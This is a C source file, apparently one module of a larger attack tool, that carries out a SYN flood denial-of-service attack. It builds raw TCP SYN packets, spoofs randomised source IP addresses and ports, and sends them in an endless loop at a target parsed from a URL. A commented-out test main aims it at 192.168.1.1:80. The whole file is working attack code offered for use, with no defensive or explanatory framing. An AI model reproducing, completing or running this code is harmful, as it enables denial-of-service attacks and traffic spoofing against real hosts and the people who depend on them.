#include <stdio.h>
// For memset
#include <string.h>
#include <sys/socket.h>
// For exit(0);
#include <stdlib.h>
// For errno - the error number
#include <errno.h>
// Provides declarations for tcp header
#include <netinet/tcp.h>
// Provides declarations for ip header
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "attack_syn_flood_dos.h"
#include "../main.h"

// from ../core/debug.c
extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
extern int DisplayInfo(const char *fmt, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmt, ...);

static unsigned short CalculateSum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

//int attack(const struct AHTTP_INPUT *ainput)
static int Attack(const pSYNStruct s, const int debug_level)
{
    // start attack now
    // create a raw socke
    // the program must run as root
    int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (socket_fd < 0)
    {
        DisplayError("Attack socket failed, %s", strerror(errno));
        return 1;
    }
    int i;
    // datagram to represent the packet
    char datagram[40960];
    char source_ip[32];
    //IP header
    struct iphdr *iph = (struct iphdr *)datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    if (!strncpy(source_ip, s->src_ip, SYN_FLOOD_IP_BUFFER_SIZE))
    {
        DisplayError("Attack strncpy failed");
        return 1;
    }
    //strcpy(source_ip, "192.168.1.1");

    sin.sin_family = AF_INET;
    sin.sin_port = htons((int)s->dst_port);
    //sin.sin_port = htons(80);
    // Target
    sin.sin_addr.s_addr = inet_addr(s->dst_ip);
    //sin.sin_addr.s_addr = inet_addr("1.2.3.4");

    // Zero out the buffer
    //memset(datagram, 0, 4096);
    if (!memset(datagram, 0, 4096))
    {
        DisplayError("Attack memset failed");
        return 1;
    }

    // Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    // Id of this packet
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    // Set to 0 before calculating checksum
    iph->check = 0;
    // Spoof the source ip address
    iph->saddr = inet_addr(source_ip);
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = CalculateSum((unsigned short *)datagram, iph->tot_len >> 1);

    // TCP Header
    tcph->source = htons((int)s->src_port);
    //tcph->source = htons(3306);
    //tcph->source = htons(1234);
    tcph->dest = htons((int)s->dst_port);
    //tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    // First and only tcp segment
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    // maximum allowed window size
    tcph->window = htons(5840);
    // If you set a checksum to zero, your kernel's IP stack
    // Should fill in the correct checksum during transmission
    tcph->check = 0;

    tcph->urg_ptr = 0;
    // Now the IP checksum

    psh.source_address = inet_addr(source_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    if (!memcpy(&psh.tcp, tcph, sizeof(struct tcphdr)))
    {
        DisplayError("Attack memcpy failed");
        return 1;
    }

    tcph->check = CalculateSum((unsigned short *)&psh, sizeof(struct pseudo_header));

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        DisplayError("Error setting IP_HDRINCL, %s", strerror(errno));
        //exit(0);
        return 1;
    }

    int flag = 1;
    int len = sizeof(int);
    if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
    {
        DisplayError("Error setting SO_REUSEADDR, %s", strerror(errno));
        //exit(0);
        return 1;
    }

    // Uncommend the loop if you want to flood :)
    //while (1)
    //{
    //Send the packet
    for (i = 0; i < s->loop; i++)
    {
        //int l;
        if (sendto(
                socket_fd,               // our socket
                datagram,                // the buffer containing headers and data
                iph->tot_len,            // total length of our datagram
                0,                       // routing flags, normally always 0
                (struct sockaddr *)&sin, // socket addr, just like in
                sizeof(sin)) < 0)        // a normal send()
        {
            DisplayError("Attack send failed");
            //break;
        }
        // Data send successfull
        /*
        else
        {
            debug(debug_level, 2, "Attack packet end successful");
        }
        */
    }

    return 0;
}

int SYNFloodAttack_Thread(pInput input)
{
    // now we start the syn flood attack
    extern void FreeSplitURLBuff(pSplitURLOutput p);
    extern int SplitURL(const char *url, pSplitURLOutput *output);
    extern void FreeRandomIPBuff(char *p);
    extern char *GetRandomIP(char **output);
    extern int GetRandomPort(int *output);

    pSYNStruct s = (pSYNStruct)malloc(sizeof(SYNStruct));
    pSplitURLOutput split_result;

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "ATTACK!");
    if (!SplitURL(input->address, &split_result))
    {
        DisplayError("SYNFloodAttack_Thread SplitURL failed");
        return 1;
    }
    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->host);
    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %d", split_result->port);
    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->suffix);
    if (split_result->port == 0)
    {
        if (strlen(split_result->host) == 0)
        {
            DisplayError("SYNFloodAttack_Thread SplitURL not right");
            return 1;
        }
        // make the port as default
        split_result->port = SYN_FLOOD_PORT_DEFAULT;
    }
    // init the target ip and port
    s->dst_ip = (char *)malloc(SYN_FLOOD_IP_BUFFER_SIZE);
    if (!(s->dst_ip))
    {
        DisplayError("SYNFloodAttack_Thread malloc failed, %s", strerror(errno));
        return 1;
    }
    if (!memset(s->dst_ip, 0, SYN_FLOOD_IP_BUFFER_SIZE))
    {
        DisplayError("SYNFloodAttack_Thread memset failed, %s", strerror(errno));
        return 1;
    }
    if (!strncpy(s->dst_ip, split_result->host, strlen(split_result->host)))
    {
        DisplayError("SYNFloodAttack_Thread strncpy failed, %s", strerror(errno));
        return 1;
    }
    s->dst_port = split_result->port;
    FreeSplitURLBuff(split_result);
    s->loop = input->each_ip_repeat;

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "SYNFloodAttack_Thread start sending data...");
    for (;;)
    {
        // here get the random ip address and port
        if (input->random_sip_address == ENABLE_SIP)
        {
            if (!GetRandomIP(&(s->src_ip)))
            {
                DisplayError("SYNFloodAttack_Thread GetRandomIP failed");
                return 1;
            }
            // this function has no failed
            GetRandomPort(&(s->src_port));
        }
        // here we will use the default ip address and port
        else
        {
            if (!strncpy(s->src_ip, SIP_ADDRESS, strlen(SIP_ADDRESS)))
            {
                DisplayError("SYNFloodAttack_Thread copy SIP_ADDRESS failed, %s", strerror(errno));
                return 1;
            }
            s->src_port = (int)SIP_PORT;
        }

        // rport is random source port
        if (Attack(s, input->debug_level))
        {
            DisplayError("SYNFloodAttack_Thread Attack failed");
            return 1;
        }
        FreeRandomIPBuff(s->src_ip);
    }
    free(s);
    return 0;
}

/*
int main(void)
{
    // for test
    pInput p = (pInput)malloc(sizeof(Input));
    p->random_sip_address = ENABLE_SIP;
    p->each_ip_repeat = 1024;
    strcpy(p->address, "192.168.1.1:80");
    SYNFloodAttack_Thread(p);
    return 0;
}
*/